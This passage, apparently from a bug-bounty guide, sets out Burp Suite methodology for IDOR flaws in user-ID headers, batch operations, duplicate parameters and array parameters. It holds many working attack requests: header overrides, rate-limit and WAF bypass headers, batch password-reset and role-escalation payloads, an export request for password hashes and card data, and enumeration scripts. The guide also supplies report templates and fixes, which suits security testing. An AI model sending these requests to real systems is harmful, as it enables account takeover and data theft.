*Which one does the server use?*

### **Step 4.2: Header Chaining**

**Test header combinations that might override:**
```http
# Chain 1: Override via debug header
X-User-ID: 101
X-Debug-User: 100

# Chain 2: Override via proxy header
X-User-ID: 101
X-Forwarded-User: 100

# Chain 3: Multiple overrides
X-User-ID: 101
X-Original-User: 100
X-On-Behalf-Of: 100
```

### **Step 4.3: Case Sensitivity Testing**

```http
# Test all case variations
x-user-id: 100
X-USER-ID: 100
X-User-Id: 100
X-USER-Id: 100
x-USER-id: 100
```

### **Step 4.4: Encoding Variations**

```http
# URL encoded header names
X-User%2DID: 100
X%2DUser%2DID: 100

# Double encoded
X%253AUser%253AID: 100

# Unicode encoded
X\u002DUser\u002DID: 100
```

---

## 🔬 **Phase 5: Validation & Exploitation**

### **Step 5.1: Positive Identification**

**Indicators of successful IDOR:**
- [ ] Can view another user's private data
- [ ] Can modify another user's data
- [ ] Can delete another user's data
- [ ] Can perform actions as another user
- [ ] Access to admin functions
- [ ] Data from different account displayed
- [ ] Status code 200 instead of 403
- [ ] Response time different from invalid ID

### **Step 5.2: Confirmation Tests**

**Test 1: Cross-user data access**
```http
1. Login as User B → capture valid session
2. Modify header: X-User-ID: 100 (User A)
3. Check if User A's data is displayed
4. Verify with actual User A data
```

**Test 2: Data modification**
```http
1. Login as User B
2. POST /api/user/profile/update
3. Add X-User-ID: 100
4. Try updating User A's profile
5. Check if changes reflect for User A
```

**Test 3: IDOR Chaining**
```http
1. Use IDOR to get User A's internal ID
2. Use that ID in another endpoint
3. Check for privilege escalation
```

### **Step 5.3: Impact Assessment**

```markdown
## Impact Analysis Checklist

### Data Exposure
- [ ] PII (names, emails, addresses)
- [ ] Financial data (credit cards, transactions)
- [ ] Medical records
- [ ] Private messages
- [ ] Documents/files
- [ ] Authentication tokens

### Business Impact
- [ ] Account takeover possible
- [ ] Data breach severity
- [ ] Compliance violations (GDPR, HIPAA)
- [ ] Financial fraud potential
- [ ] Reputation damage

### Exploitability
- [ ] Requires user interaction
- [ ] Can be automated
- [ ] Scalable enumeration
- [ ] Stealth level
```

---

## 🛡️ **Phase 6: Bypassing Protections**

### **Step 6.1: Rate Limiting Bypass**

**Use Burp Intruder with rotation:**
```python
# Add headers to avoid rate limiting
X-Forwarded-For: 192.168.1.§1-255§
X-Real-IP: 10.0.0.§1-255§
User-Agent: rotate between common UAs
```

### **Step 6.2: WAF Bypass**

**Add noise headers:**
```http
X-User-ID: 100
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### **Step 6.3: Authorization Bypass**

**Test if headers override cookies:**
```http
# Remove cookie, add header
GET /api/profile HTTP/1.1
X-User-ID: 100
# No Cookie header
```

**Test header priority:**
```http
# Both present - which wins?
Cookie: session=user101
X-User-ID: 100
```

---

## 📝 **Phase 7: Automation with Burp Macros**

### **Step 7.1: Create Session Handling Rules**

1. **Project options → Sessions → Session handling rules → Add**

2. **Rule description: "Add X-User-ID header for testing"**

3. **Rule actions → Add → Run a macro**
   - Record login for User A
   - Record login for User B
   - Set up token extraction

4. **Scope:**
   - Tools: Intruder, Repeater, Scanner
   - URL: target.com

### **Step 7.2: Create Custom Intruder Payloads**

**Python payload generator:**
```python
# Payload generator for Burp Intruder
def generate_payloads():
    # Generate header variations
    headers = [
        ("X-User-ID", 100),
        ("X-UserId", 100),
        ("X-UID", 100),
        ("X-Customer-ID", 100),
    ]
    
    # Add encoding variations
    for header, value in headers:
        yield header.encode()
        yield header.lower().encode()
        yield header.upper().encode()
        
    # Add value variations
    for i in range(1, 100):
        yield f"X-User-ID: {i}".encode()
```

---

## 📈 **Phase 8: Reporting Template**

```markdown
# IDOR Vulnerability Report: HTTP Header Manipulation

## Vulnerability Details
- **Bug Type:** Insecure Direct Object Reference (IDOR)
- **Location:** [Endpoint URL]
- **Header:** X-User-ID
- **Severity:** High/Critical
- **CVSS Score:** 8.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

## Description
The application accepts user identification through the X-User-ID header
without proper authorization checks, allowing attackers to access other
users' data by modifying this header value.

## Steps to Reproduce

### Prerequisites
- Two test accounts: UserA (ID 100) and UserB (ID 101)
- Burp Suite configured

### Proof of Concept

1. Login as UserB and capture request:
```
GET /api/user/profile HTTP/1.1
Host: example.com
Cookie: session=userB_session
```

2. Modify request to include X-User-ID header:
```
GET /api/user/profile HTTP/1.1
Host: example.com
X-User-ID: 100
Cookie: session=userB_session
```

3. Observe response contains UserA's private data:
```json
{
  "user_id": 100,
  "email": "usera@example.com",
  "private_data": "..."
}
```

## Impact
- Unauthorized access to 10,000+ user profiles
- Exposure of PII (names, emails, addresses)
- GDPR violation potential
- Account takeover possible

## Remediation
1. Remove reliance on client-supplied user identifiers
2. Implement server-side session validation
3. Use indirect reference maps
4. Add proper authorization checks
5. Consider removing debug headers in production

## Technical Evidence
- Screenshot 1: Request with X-User-ID: 101 (own data)
- Screenshot 2: Request with X-User-ID: 100 (victim data)
- Burp session file attached
- Python PoC script attached
```

---

## 🛠️ **Useful Burp Extensions for This Bug**

| Extension | Purpose | Installation |
|-----------|---------|--------------|
| **Param Miner** | Discover hidden headers | BApp Store |
| **Head3rs** | Header vulnerability testing | BApp Store |
| **Autorize** | Authorization bypass detection | BApp Store |
| **Authz** | Permission testing | BApp Store |
| **Logger++** | Advanced request logging | BApp Store |
| **Turbo Intruder** | High-speed fuzzing | BApp Store |
| **HTTP Request Smuggler** | Header injection | BApp Store |
| **Backslash Powered Scanner** | Advanced scanning | BApp Store |

---

## 📚 **Additional Resources**

### Burp Suite Pro Tips
- Use **Session Handling Rules** for automatic header injection
- Create **Custom Scan Checks** for IDOR detection
- Use **Extensions API** for custom payloads
- Master **Intruder Attack Types** (Sniper, Battering ram, Pitchfork, Cluster bomb)

### Practice Labs
- PortSwigger: IDOR labs (specifically header-based)
- PentesterLab: "HTTP Header Injection" exercises
- HackTheBox: Machines with header-based IDOR

### Wordlists to Use
- SecLists: `/Discovery/Web-Content/burp-parameter-names.txt`
- SecLists: `/Discovery/Web-Content/headers.txt`
- Custom generated from JavaScript files

---

## ✅ **Success Checklist**

- [ ] Identified at least 3 endpoints accepting user IDs
- [ ] Tested 50+ header variations
- [ ] Confirmed IDOR with two different user accounts
- [ ] Documented exact request/response
- [ ] Assessed business impact
- [ ] Created proof of concept
- [ ] Reported with clear remediation steps

---

# 🔍 **Bug #25: IDOR in Batch Operations - Complete Burp Suite Methodology**

## 📋 **Bug Description**
**Bug #25** refers to **IDOR vulnerabilities in batch operations** where applications allow processing multiple records simultaneously. These endpoints are particularly dangerous because a single request can access/modify hundreds of records.

---

## 🎯 **Target Characteristics**
Look for endpoints with:
- `/batch`, `/bulk`, `/mass-` in URL
- Array parameters (`users[]`, `ids[]`)
- CSV/JSON lists of IDs
- Import/Export functionality
- Multi-select operations
- Admin panel bulk actions

---

## 🛠️ **Complete Burp Suite Methodology**

### **PHASE 1: Reconnaissance & Mapping**

#### **Step 1.1: Spider the Target**
```
1. Configure Burp:
   - Proxy → Options → Spider → Check "Spider form inputs"
   - Scope → Add target domain

2. Manual browsing:
   - Click every bulk operation button
   - Test all multi-select features
   - Use "Import", "Export", "Mass Update" features
   - Check admin panels thoroughly
```

#### **Step 1.2: Parameter Discovery**
```bash
# Use Burp Intruder for parameter fuzzing
1. Send request to Intruder
2. Add positions at:
   - URL path: /api/v1/§batch§
   - Query params: ?§action§=bulk
   - JSON keys: {"§ids§":[1,2,3]}
   
3. Payloads (common batch parameter names):
   ids, batch_ids, user_ids, record_ids, items, 
   selected, list, array, bulk, mass, multiple,
   collection, data_set, records, entries
```

### **PHASE 2: Request Analysis**

#### **Step 2.1: Identify Batch Request Formats**

**JSON Array Format:**
```json
POST /api/users/batch HTTP/1.1
Content-Type: application/json

{
    "ids": [100, 101, 102],
    "operation": "delete"
}
```

**CSV/Comma Format:**
```
POST /api/bulk-delete HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ids=100,101,102&action=delete
```

**Range Format:**
```
GET /api/export?user_range=100-200
```

**Multi-Parameter Format:**
```
POST /api/update-multiple
id[]=100&id[]=101&id[]=102
```

### **PHASE 3: IDOR Testing Methodology**

#### **Step 3.1: Setup Burp Intruder for Batch Testing**

**Configuration:**
```
Target: https://target.com/api/users/batch
Attack Type: Sniper or Pitchfork

Payload Positions:
{"ids":[§100§,101,102]}
```

**Payload Sets:**
```
Set 1: Sequential IDs (100,101,102,103...)
Set 2: Other users' IDs (gathered from recon)
Set 3: Negative/zero IDs (0, -1, -999)
Set 4: Large numbers (999999, 999999999)
Set 5: Non-existent IDs
Set 6: Admin IDs (1, 2, 500, admin, root)
```

#### **Step 3.2: Response Analysis Techniques**

```python
# Response comparison script for Burp Extender
def analyze_response(response):
    indicators = {
        'success': [200, 'success', 'true', 'updated'],
        'failure': [403, 404, 'error', 'denied', 'unauthorized'],
        'partial_success': ['partially', 'some', 'limited']
    }
    
    # Check status codes
    if response.status_code == 200:
        # Analyze response body for data leakage
        if 'other_user' in response.body:
            return "IDOR_CONFIRMED"
```

### **PHASE 4: Specific Attack Vectors**

#### **Vector 4.1: Vertical IDOR (Privilege Escalation)**

**Original Request (User A):**
```json
POST /api/bulk-delete HTTP/1.1
Cookie: session=userA_session

{
    "documents": [1001, 1002, 1003]
}
```

**Modified Request (Try Admin IDs):**
```json
{
    "documents": [1, 2, 3, 4, 5]  // Admin document IDs
}
```

**Burp Intruder Setup:**
```
1. Send to Intruder
2. Payload positions: [§1§, §2§, §3§, §4§, §5§]
3. Payload type: Numbers (sequential 1-100)
4. Resource pool: 1 thread (avoid rate limiting)
```

#### **Vector 4.2: Horizontal IDOR (Access Other Users)**

**Original Request:**
```json
POST /api/export HTTP/1.1

{
    "user_ids": [501, 502]  // User A's friends
}
```

**Modified Request:**
```json
{
    "user_ids": [101, 102, 103, 104]  // Random users
}
```

**Enumeration Strategy:**
```
1. Gather valid user IDs from:
   - Public profiles
   - API responses
   - Comments/posts
   - Error messages

2. Test in batches of 10-20 IDs
3. Monitor response times (longer = more data)
```

#### **Vector 4.3: Mass Assignment IDOR**

**Original:**
```json
POST /api/users/update-batch HTTP/1.1

{
    "updates": [
        {"id": 100, "email": "user@test.com"},
        {"id": 101, "email": "friend@test.com"}
    ]
}
```

**Modified:**
```json
{
    "updates": [
        {"id": 1, "email": "hacker@evil.com"},   // Admin
        {"id": 2, "email": "hacker@evil.com"},   // Another admin
        {"id": 3, "email": "hacker@evil.com"}    // System account
    ]
}
```

### **PHASE 5: Advanced Burp Techniques**

#### **5.1: Using Burp Comparer**
```
1. Send original response (valid user)
2. Send modified response (other user)
3. Comparer → Word/Byte comparison
4. Look for:
   - Different data lengths
   - New fields appearing
   - Missing authorization headers
   - Different status codes
```

#### **5.2: Burp Intruder - Grep Extract**
```
Intruder → Options → Grep - Extract:
1. Add item: "total_count": "(\d+)"
2. Add item: "users": \[(.*?)\]
3. Add item: "error": "([^"]*)"

This automatically highlights:
- Number of records accessed
- Data being leaked
- Error patterns
```

#### **5.3: Burp Sequencer for Predictable IDs**
```
1. Capture 100+ batch requests
2. Send to Sequencer
3. Analyze token/ID randomness
4. If predictable → Generate valid IDs for attack
```

### **PHASE 6: Exploitation Scenarios**

#### **Scenario 6.1: Data Exfiltration via Export**
```http
POST /api/export/batch HTTP/1.1
Host: target.com
Cookie: session=valid_user

{
    "export_type": "user_data",
    "user_ids": [1,2,3,4,5,6,7,8,9,10],
    "fields": ["email", "password_hash", "credit_card"]
}
```

#### **Scenario 6.2: Mass Account Takeover**
```http
POST /api/admin/password-reset/batch HTTP/1.1
Cookie: session=admin_session  # Check if admin check missing

{
    "user_ids": [101,102,103,104],
    "new_password": "hacked123",
    "notify_user": false
}
```

#### **Scenario 6.3: Bulk Privilege Escalation**
```http
POST /api/admin/role-update/batch HTTP/1.1

{
    "user_ids": [101,102,103,104],
    "new_role": "administrator"
}
```

### **PHASE 7: Detection & Validation**

#### **Success Indicators:**
```yaml
Positive signs:
  - HTTP 200 on batch with mixed ownership
  - Response contains other users' data
  - Different response lengths
  - "success": true for all IDs
  - No ownership validation errors
  
Critical signs:
  - Access to admin IDs
  - Password hash exposure
  - PII leakage
  - Payment information
```

#### **Negative Indicators:**
```yaml
Properly secured:
  - 403 Forbidden for unauthorized IDs
  - 400 Bad Request with mixed ownership
  - "unauthorized" in response
  - Only returns owned records
  - Proper filtering applied
```

### **PHASE 8: Automation with Burp Extensions**

#### **8.1: Autorize Extension Setup**
```
1. Install Autorize from BApp Store
2. Configuration:
   - Check "Detect IDOR"
   - Enable "Batch operation mode"
   - Set "Authorization header" if needed
3. Run requests through Autorize
4. Look for "Potential IDOR" alerts
```

#### **8.2: AuthMatrix Configuration**
```
1. Install AuthMatrix
2. Create roles: UserA, UserB, Admin
3. Add batch endpoints
4. Generate matrix
5. Identify privilege gaps
```

#### **8.3: Custom Python Extender Script**
```python
from burp import IBurpExtender, IIntruderPayloadGenerator
import random

class BurpExtender(IBurpExtender, IIntruderPayloadGenerator):
    
    def generatePayload(self, baseValue):
        # Generate batch ID combinations
        batch_sizes = [5, 10, 20, 50, 100]
        for size in batch_sizes:
            ids = [str(random.randint(1, 1000)) for _ in range(size)]
            yield ','.join(ids)
```

### **PHASE 9: Reporting Template**

```markdown
# IDOR in Batch Operation - Critical Finding

## Vulnerability Type
Insecure Direct Object Reference (IDOR) in batch user update endpoint

## Endpoint
POST /api/users/batch-update

## Description
The application fails to validate ownership when processing batch operations, allowing authenticated users to modify arbitrary user accounts.

## Steps to Reproduce
1. Login as user A (ID: 100)
2. Capture batch update request:
   POST /api/users/batch-update
   {"user_ids":[100,101,102],"email":"hacker@test.com"}
3. Modify to include victim IDs:
   {"user_ids":[1,2,3,4,5,100],"email":"hacker@test.com"}
4. Observe 200 OK response
5. Verify victim accounts updated

## Impact
- Mass account takeover possible
- Data breach of 1000+ users
- Privilege escalation to admin

## Proof of Concept
[Include Burp screenshots]
[Request/Response pairs]
[Extracted sensitive data]

## Remediation
- Implement ownership checks per record
- Use database-level filtering
- Limit batch sizes
- Log all batch operations
```

### **PHASE 10: Advanced Tips & Tricks**

#### **10.1: Bypass Rate Limiting**
```python
# Use Burp Intruder with delays
1. Intruder → Resource Pool
2. Set "Maximum concurrent requests": 1
3. Set "Delay between requests": 1000ms
4. Add random jitter
```

#### **10.2: Handle CSRF Tokens**
```python
1. Use Burp Macros
2. Project Options → Sessions
3. Create macro to extract fresh token
4. Apply to batch requests
```

#### **10.3: Test Blind IDOR**
```http
POST /api/analytics/batch HTTP/1.1

{
    "events": [
        {"user_id": 100, "action": "view"},
        {"user_id": 1, "action": "view"}  # Check if logged
    ]
}

# Check:
1. Analytics dashboard
2. Log files
3. Admin notifications
4. Response timing differences
```

#### **10.4: GraphQL Batch Queries**
```graphql
POST /graphql HTTP/1.1

{
  "query": "query batch($ids: [ID!]!) {
    users(ids: $ids) {
      id
      email
      password
      creditCard
    }
  }",
  "variables": {
    "ids": [1, 2, 3, 4, 5, 100, 101]
  }
}
```

### **🚨 Critical Checkpoints**

```javascript
// When testing batch operations, ALWAYS check:
const criticalPoints = [
  "Does response contain other users' data?",
  "Can I mix my IDs with admin IDs?",
  "Does batch size affect authorization?",
  "Are there different error messages?",
  "Can I import malicious payloads?",
  "Is there an audit log bypass?",
  "Can I chain with other vulnerabilities?"
];
```

### **📊 Success Metrics**

| Test Type | Success Indicator | Severity |
|-----------|-------------------|----------|
| Mix IDs | Access to 1+ foreign records | Medium |
| All Foreign | Complete data access | High |
| Admin IDs | Privilege escalation | Critical |
| Mass Update | Account takeover | Critical |
| Data Export | PII exposure | High |
| File Operations | System files access | Critical |

---

## 🎯 **Quick Checklist for Bug #25**

- [ ] Identify all batch endpoints
- [ ] Map request formats (JSON, CSV, array)
- [ ] Test mixing owned/unowned IDs
- [ ] Test all-foreign IDs
- [ ] Test admin/system IDs
- [ ] Check response for data leakage
- [ ] Verify with multiple user accounts
- [ ] Document authorization gaps
- [ ] Create proof of concept
- [ ] Write detailed report

---

# 🎯 **Bug #26: Duplicate Parameters IDOR - Complete Burp Suite Methodology**

## **What is Bug #26?**
**HTTP Parameter Pollution (HPP) via Duplicate Parameters** - When the server receives multiple parameters with the same name (`?id=100&id=101`), different technologies handle this differently. This can lead to IDOR if the server uses the "wrong" parameter value for authorization vs. data retrieval.

---

## 📚 **Understanding the Vulnerability**

### **How Different Technologies Handle Duplicate Parameters:**

| Technology | Behavior |
|------------|----------|
| **PHP/Apache** | Last parameter wins (`id=101`) |
| **ASP.NET/IIS** | Concatenates with comma (`100,101`) |
| **Node.js/Express** | Usually first parameter wins or creates array |
| **Python/Flask** | Typically last parameter wins |
| **Java/Spring** | Usually first parameter wins |
| **Ruby on Rails** | Creates array, needs specific handling |
| **Nginx/Apache** | Passes all parameters to backend |

### **The IDOR Scenario:**
- **Authorization Check** uses first parameter (`id=100` - YOUR resource)
- **Data Retrieval** uses second parameter (`id=101` - VICTIM's resource)
- Result: You access `id=101` while authorized for `id=100`

---

## 🔍 **FULL BURP SUITE METHODOLOGY**

### **PHASE 1: Reconnaissance & Discovery**

#### **Step 1.1: Map the Application**
1. **Spider the target**:
   - Right-click target → **Spider** → **Spider this host**
   - Use **Engagement tools** → **Discover content**

2. **Identify all parameters**:
   - Use **Burp Scanner** passive crawl
   - Check **Target** → **Site map** for all endpoints
   - Look for patterns like: `id`, `user_id`, `file`, `doc`, `order`, `account`

3. **Create parameter wordlist**:
```
id
user_id
userId
account_id
file_id
document_id
order_id
profile_id
customer_id
pid
uid
ref
reference
```

#### **Step 1.2: Identify Potential Targets**
Look for endpoints that:
- Display user-specific data
- Perform actions on resources
- Have sequential/numeric IDs
- Don't have obvious access controls

**Common vulnerable endpoints:**
```
/api/user/profile?id=100
/download.php?file=100
/view_order.php?order=100
/account/settings?user_id=100
/documents/view?doc=100
/messages/read?message_id=100
```

---

### **PHASE 2: Baseline Testing**

#### **Step 2.1: Capture Normal Request**
1. Intercept a request with an ID parameter:
   - Turn on **Intercept** (Proxy → Intercept)
   - Perform action in browser
   - Send to **Repeater** (Right-click → Send to Repeater)

2. **Document baseline response**:
   - Status code
   - Response length
   - Unique identifiers in response
   - User-specific data

#### **Step 2.2: Test Basic IDOR First**
Before trying duplicate params, confirm basic IDOR exists:
```
Normal: id=100 → Your data
Test:   id=101 → If accessible, you have IDOR
Test:   id=99  → If accessible, you have IDOR
```

**In Burp Repeater:**
1. Change parameter value
2. Send request
3. Compare responses

---

### **PHASE 3: Duplicate Parameters Testing**

#### **Step 3.1: Manual Testing in Repeater**

**Test Cases to Try:**

```
# Test 1: Same value, duplicate
?id=100&id=100

# Test 2: Different values (your ID + victim ID)
?id=100&id=101

# Test 3: Different values (victim ID + your ID)
?id=101&id=100

# Test 4: Multiple duplicates
?id=100&id=101&id=102&id=103

# Test 5: With other parameters
?user_id=100&id=101&user_id=102
```

**Step-by-Step in Repeater:**

1. **Send request with normal params** → Record response
2. **Add duplicate parameter**:
   - In Repeater, locate the parameter in request
   - Add `&id=101` at the end
   - Send and compare response

3. **Check response differences**:
   - Look for data from victim (id=101)
   - Check if response matches id=101's data
   - Verify you're still authenticated as id=100

#### **Step 3.2: Parameter Location Variations**

Test duplicates in different positions:

```
# URL Query String
GET /api/user?id=100&id=101

# POST Body (application/x-www-form-urlencoded)
POST /api/user
Content-Type: application/x-www-form-urlencoded

id=100&id=101

# POST Body + URL
GET /api/user?id=100
POST /api/user
id=101

# JSON Body
POST /api/user
Content-Type: application/json

{"id":100, "id":101}  // Note: JSON usually uses last value
```

---

### **PHASE 4: Automated Testing with Burp Intruder**

#### **Step 4.1: Set Up Intruder Attack**

1. **Send request to Intruder**:
   - Right-click → **Send to Intruder**

2. **Configure Payload Positions**:
   - Go to **Positions** tab
   - Clear all payload positions (Click "Clear §")
   - Add positions for duplicate parameters:

```
GET /api/user?id=§100§&id=§101§
```

3. **Alternative: Two separate positions**:
```
GET /api/user?id=§100§&id=§101§
```

#### **Step 4.2: Payload Configuration**

**Payload Set 1 (First ID - Your ID):**
- Payload type: **Numbers**
- From: Your ID (e.g., 100)
- To: Your ID (100)
- Step: 1

**Payload Set 2 (Second ID - Target IDs):**
- Payload type: **Numbers** or **Simple list**
- From: 1 to 1000
- Or use a wordlist of potential IDs

#### **Step 4.3: Attack Types**

**Sniper Attack** (if testing one variable):
```
?id=§100§&id=101  → Tests changing first ID
?id=100&id=§101§  → Tests changing second ID
```

**Battering Ram** (same value in both):
```
?id=§100§&id=§100§  → Both positions get same value
```

**Pitchfork** (paired values):
```
Position 1: 100, 100, 100, 100
Position 2: 1,   2,   3,   4
```

**Cluster Bomb** (all combinations):
```
Position 1: 100, 100, 100, 101, 101, 101
Position 2: 1,   2,   3,   1,   2,   3
```

#### **Step 4.4: Payload Processing Rules**

Add processing rules to enhance testing:

1. **Add encoder rules**:
   - URL encode all characters
   - Base64 encode (if API expects encoded)

2. **Add prefix/suffix**:
   - Add leading zeros: `00100`
   - Add brackets: `id[100]`

3. **Hash payloads**:
   - If IDs are hashed, try common hashes

---

### **PHASE 5: Advanced Burp Techniques**

#### **Step 5.1: Using Burp Comparer**

1. **Collect responses**:
   - Send requests for `id=100` (your resource)
   - Send requests for `id=101` (victim resource)
   - Send duplicate param requests

2. **Compare responses**:
   - Select two responses in **Target** → **Site map**
   - Right-click → **Send to Comparer**
   - Analyze differences

#### **Step 5.2: Burp Scanner - Active Scan with Custom Insertion Points**

1. **Define custom insertion points**:
   - Go to **Scanner** → **Insertion points**
   - Add rule for duplicate parameters

2. **Create scan configuration**:
   - **Scanner** → **Scan configuration**
   - Enable **Parameter pollution checks**
   - Customize payloads

#### **Step 5.3: Extender - Useful Extensions**

Install these extensions for better testing:

1. **Paramalyzer** - Tracks parameter usage
2. **Hackvertor** - Advanced encoding/decoding
3. **Turbo Intruder** - High-speed attacks
4. **Copy As Python-Requests** - Export for custom scripts
5. **Param Miner** - Discovers hidden parameters

**Turbo Intruder Script Example:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)
    
    for i in range(1, 1000):
        engine.queue(target.req, [
            f'id=100&id={i}',
            f'id={i}&id=100'
        ])

def handleResponse(req, interesting):
    if 'unauthorized' not in req.response.lower():
        table.add(req)
```

---

### **PHASE 6: Detection & Validation**

#### **Step 6.1: Response Analysis Checklist**

✅ **Status Code Changes**:
- 200 vs 403/404
- 302 Redirects

✅ **Response Length**:
- Compare with baseline
- Use **Intruder** → **Results** → **Sort by length**

✅ **Content Differences**:
- Personal information
- Usernames/emails
- Transaction data
- File names/paths

✅ **Timing Differences**:
- Valid resources might take longer
- Use **Intruder** → **Results** → **Sort by response time**

#### **Step 6.2: False Positive Validation**

For each potential finding:

1. **Replicate manually** in Repeater
2. **Incognito test** - Log out, try accessing
3. **Different user account** - Test with another account
4. **Check authorization context** - Are you supposed to access this?
5. **Verify data ownership** - Does the data belong to another user?

#### **Step 6.3: Impact Assessment**

Document for each finding:
- **Data exposed**: What information?
- **Actions possible**: Can you modify/delete?
- **User base affected**: All users? Specific roles?
- **Business impact**: Financial? Privacy? Reputation?
- **Attack complexity**: Easy to exploit?

---

### **PHASE 7: Exploitation & Proof of Concept**

#### **Step 7.1: Create Exploit Proof**

**Browser-based PoC** (if GET request):
```html
<img src="https://target.com/api/user?id=100&id=101">
```

**JavaScript PoC**:
```javascript
fetch('https://target.com/api/user?id=100&id=101', {
    credentials: 'include'
}).then(r => r.text()).then(console.log)
```

**HTML Form PoC**:
```html
<form method="POST" action="https://target.com/api/user">
    <input type="hidden" name="id" value="100">
    <input type="hidden" name="id" value="101">
    <input type="submit" value="Exploit">
</form>
```

#### **Step 7.2: Chain with Other Vulnerabilities**

Check if duplicate params IDOR can lead to:
- **Account takeover** (if profile update)
- **Privilege escalation** (if admin functions)
- **Data exfiltration** (mass data access)
- **Business logic bypass** (order manipulation)

---

## 📊 **Testing Matrix**

Use this matrix to track your testing:

| Endpoint | Method | Normal ID | Test ID | Duplicate Pattern | Response | Vulnerable? |
|----------|--------|-----------|---------|-------------------|----------|-------------|
| /api/user | GET | 100 | 101 | 100&101 | User 101 data | YES |
| /download | GET | 500 | 501 | 500&501 | 403 | NO |
| /update | POST | 200 | 201 | 200&201 | Success | YES |

---

## 🛠️ **Burp Suite Configuration Tips**

### **Optimize Intruder for IDOR**

1. **Resource Pool**:
   - Create new resource pool
   - Set 1 concurrent request (avoid rate limiting)
   - Set 0 delay between requests

2. **Grep - Extract**:
   - Add extract rules for usernames/emails
   - Extract response codes
   - Extract content-length

3. **Grep - Match**:
   - Add strings to match: `unauthorized`, `forbidden`, `access denied`
   - Match personal data patterns

### **Macros for Authentication**

Create macros to handle:
- Login before testing
- Session refresh
- CSRF tokens

1. **Project options** → **Sessions**
2. **Add** → **Macro** recorder
3. Record login sequence
4. Configure session handling rules

---

## ⚠️ **Common Pitfalls & Solutions**

| Pitfall | Solution |
|---------|----------|
| Rate limiting | Use delays, rotate IPs (if allowed) |
| CSRF tokens | Extract with macros |
| Session expiration | Implement auto-refresh |
| Large response sets | Use grep -extract filters |
| False positives | Manual verification |

---

## 📝 **Reporting Template**

```markdown
# IDOR via HTTP Parameter Pollution (Duplicate Parameters)

## Vulnerability
The endpoint `/api/user/profile` is vulnerable to IDOR through duplicate parameters.

## Affected Endpoint
GET /api/user/profile?id=100&id=101

## Impact
An attacker can view any user's profile by adding their ID as a duplicate parameter.

## Proof of Concept
1. Log in as user ID 100
2. Visit: https://target.com/api/user/profile?id=100&id=101
3. Observe profile data for user 101

## Technical Details
- Backend: PHP (last parameter wins)
- Authorization: Checks first parameter
- Data retrieval: Uses last parameter

## Remediation
- Use consistent parameter handling
- Implement server-side access controls
- Consider using POST with single parameter
```

---

## 🎯 **Success Indicators**

You've found Bug #26 when:
- [ ] Normal request shows YOUR data
- [ ] Duplicate param request shows OTHER user's data
- [ ] You're still authenticated as YOUR user
- [ ] No authorization errors received
- [ ] Response contains victim's private data

---

## 🔬 **Practice Lab Setup**

**Create test environment** (PHP example):
```php
<?php
// Vulnerable code
$user_id = $_GET['id']; // Gets last parameter
$auth_user = $_GET['id']; // Gets first parameter? 

// Authorization
if(!checkAuth($auth_user)) die('Unauthorized');

// Data retrieval
$data = getUserData($user_id);
echo json_encode($data);
?>
```

---

# Complete Methodology for Bug #27: Array Parameters IDOR in Burp Suite

## 🎯 **Bug #27: Array Parameters IDOR**
**Technique:** `?id[]=100&id[]=101` - Testing array-style parameter handling

---

## 📋 **PREREQUISITES & SETUP**

### **Required Tools**
- Burp Suite Professional/Community
- Browser with Burp CA certificate installed
- FoxyProxy or similar for quick proxy switching

### **Initial Configuration**
1. **Burp Proxy Setup**
   ```
   Proxy → Intercept → Intercept is on
   Proxy → Options → Add: 127.0.0.1:8080
   ```

2. **Scope Configuration**
   ```
   Target → Scope → Add target domain
   Check "Use advanced scope control"
   Include all subdomains and parameters
   ```

---

## 🔍 **PHASE 1: RECONNAISSANCE & PARAMETER DISCOVERY**

### **Step 1.1: Passive Discovery**
1. **Browse application normally** while capturing traffic
2. **Target Scope:**
   ```
   Right-click on request → Add to Scope
   ```

3. **Filter Traffic:**
   ```
   Proxy → HTTP History → Filter:
   ✓ Show only in-scope items
   ✓ Hide CSS/JS/Images
   ```

### **Step 1.2: Identify Potential Parameters**
Look for patterns in requests:

```
GET /api/user/profile?id=100
GET /api/posts/view?post_id=200
POST /api/update-profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=100&name=John
```

**Document these in Burp:**
```
Target → Site Map → Right-click → Add Note:
[IDOR-Potential] Parameter: id (numeric), user_id, accountId
```

### **Step 1.3: Spider for Hidden Endpoints**
```
Target → Site Map → Right-click → Spider this host
Check: "Spider all links recursively"
```

---

## 🧪 **PHASE 2: BASELINE TESTING**

### **Step 2.1: Create Test Accounts**
Create 3 accounts for testing:
```
Account A (Attacker) - attacker@test.com
Account B (Victim 1) - victim1@test.com  
Account C (Victim 2) - victim2@test.com
```

### **Step 2.2: Capture Authenticated Requests**
1. **Login as Account A**
2. **Perform actions on your own resources**
3. **Capture requests in Burp**

Example captured request:
```
GET /api/documents/view?id=100 HTTP/1.1
Host: target.com
Cookie: session=ABC123
```

### **Step 2.3: Establish Baseline Behavior**
Send to Repeater (Ctrl+R):
```
Right-click → Send to Repeater
```

Test with your own IDs:
- `id=100` → 200 OK (your document)
- `id=999999` → 403/404 (non-existent)
- `id=0` → 403/404

---

## 🔬 **PHASE 3: ARRAY PARAMETER TESTING METHODOLOGY**

### **Step 3.1: Convert Standard Parameter to Array**

**Original Request:**
```
GET /api/documents/view?id=100 HTTP/1.1
```

**Test 1: Simple Array**
```
GET /api/documents/view?id[]=100 HTTP/1.1
```
*Check response behavior*

**Test 2: Multiple Values**
```
GET /api/documents/view?id[]=100&id[]=101 HTTP/1.1
```

### **Step 3.2: Burp Repeater Testing Sequence**

Create a testing sequence in Repeater:

**Request 1: Control**
```
GET /api/documents/view?id=100
```
Response: 200 OK (your document)

**Request 2: Empty Array**
```
GET /api/documents/view?id[]=
```
Response: Note behavior

**Request 3: Single Array Element**
```
GET /api/documents/view?id[]=100
```
Response: 200 OK or different?

**Request 4: Two Elements (One Yours, One Victim's)**
```
GET /api/documents/view?id[]=100&id[]=101
```
Response: Critical observation point!

### **Step 3.3: Automated Testing with Burp Intruder**

**Setup Intruder Attack:**
```
Right-click request → Send to Intruder
Positions → Clear § → Add § around parameter
```

**Payload Positions:**
```
